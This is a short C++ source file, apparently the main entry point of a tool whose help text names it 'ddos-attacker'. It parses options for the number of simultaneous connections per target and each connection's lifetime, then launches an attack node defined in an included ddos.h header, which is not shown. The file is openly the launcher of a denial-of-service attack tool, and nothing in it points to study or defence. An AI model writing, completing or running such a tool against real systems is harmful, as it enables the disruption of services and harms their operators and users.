#include "ddos.h"

int main(int argc, char const *argv[])
{
	int wait = 0;
	long queue = 0;
	for (int i = 1; i < argc; i++)
		if (!strncmp(argv[i],"-w=",3))
			wait = atoi(&argv[i][3]);
		else if (!strncmp(argv[i],"--wait=",7))
			wait = atoi(&argv[i][7]);
		else if (!strncmp(argv[i],"-q=",3))
			queue = atol(&argv[i][3]);
		else if (!strncmp(argv[i],"--queue=",8))
			queue = atol(&argv[i][8]);
		else if (!strncmp(argv[i],"--help",8)) {
			cout << "usage: ddos-attacker [options]\n\n";
			cout << "   -q, --queue=QUEUE\tSets the number of simultaneous connections per target.\n";
			cout << "   -w, --wait=SECONDS\tSets the lifetime of each connection on the queue.\n";
			return 0;
		}

	if (wait && queue) {
		attack::node mynode(wait, queue);
		attack::initialize(mynode);
	} else {
		attack::node mynode;
		attack::initialize(mynode);
	}
	return 0;
}